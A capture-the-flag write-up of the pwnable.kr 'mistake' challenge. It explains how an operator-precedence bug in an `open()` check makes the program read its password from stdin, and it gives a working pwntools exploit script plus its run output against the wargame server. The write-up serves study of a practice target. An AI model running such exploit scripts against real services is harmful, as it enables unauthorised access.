---
title: "[pwnable.kr] mistake"
published: 2026-09-30
description: Solving a wargame challenge
category: CTF
tags: [pwnable.kr, study]
draft: false
---

# mistake
I couldn't find any obvious vulnerability, which was almost unsettling.  
The fact that the challenge was about operator precedence caught me off guard.  
It felt like something you'd see on a basic programming certification exam. At least it involved a function I recognized...  

I skimmed the conditionals way too casually. If I'd paid closer attention, I might have solved it sooner.  

# Code Analysis
```c
...
#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
	int i;
	for(i=0; i<len; i++){
		s[i] ^= XORKEY;
	}
}

int main(int argc, char* argv[]){
	int fd;
	if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
		printf("can't open password %d\n", fd);
		return 0;
	}

	printf("do not bruteforce...\n");
	sleep(time(0)%20);

	char pw_buf[PW_LEN+1];
	int len;
	if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
		printf("read error\n");
		close(fd);
		return 0;		
	}

	char pw_buf2[PW_LEN+1];
	printf("input password : ");
	scanf("%10s", pw_buf2);

	// xor your input
	xor(pw_buf2, 10);

	if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
	  ...
		system("/bin/cat flag\n");
	}
	else{
		...
	}

	close(fd);
	return 0;
}
```

## A Closer Look
Surprisingly, the snippet already contains only the parts that matter, so there isn't much to leave out. Or maybe I'm still an idiot...  
As you can see, the input itself isn't the problem. The mistake is in the first `if` statement.  
`if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0)`.  

According to **operator precedence**, the comparison operator `<` takes priority over the assignment operator `=`.  
So first, we need to know what `open()` returns.  

That tells us how the condition behaves. Since this is Unix C, I assume most readers know they can check these things with `man`.  
If you're curious, the manual is here:  
`https://man7.org/linux/man-pages/man2/open.2.html`
The call to `open()` should return 3.  

That's because the file descriptors for `stdin`, `stdout`, and `stderr` are 0, 1, and 2, respectively. I just wanted to mention that...  

Anyway, `open()` should return 3—or at least a value greater than zero. The comparison is therefore false, and its result (`0`) is assigned to `fd`; the `if` body is skipped and execution moves on.  

# Solution
Putting that together, we can put the original password we want into `pw_buf`,  
and put the same value into `pw_buf2`, which is used in the comparison.  

+)  
The rest is straightforward enough that I didn't think it needed more explanation.  

```py
from pwn import *
import time

context.binary = elf = ELF('./mistake')
context.log_level = 'info'

#p = process()
p = remote('pwnable.kr', 10008)

pass_ = b'BANKAI'.ljust(10, b'A')
pass_xor = bytearray(pass_)

for _ in range(len(pass_)):
	pass_xor[_] = pass_[_] ^ 1

log.info(f"pass_xor'ed: {pass_xor}")
log.info(f"pass: {pass_}")

time.sleep(20)

p.sendline(pass_xor)
p.sendlineafter(b': ', pass_)

p.interactive()
```

```bash
[*] '/home/bankai/pwnable.kr/mistake/mistake'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to pwnable.kr on port 10008: Done
[*] pass_xor'ed: bytearray(b'C@OJ@H@@@@')
[*] pass: b'BANKAIAAAA'
[*] Switching to interactive mode
Password OK
{sort of censored}
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to pwnable.kr port 10008
```
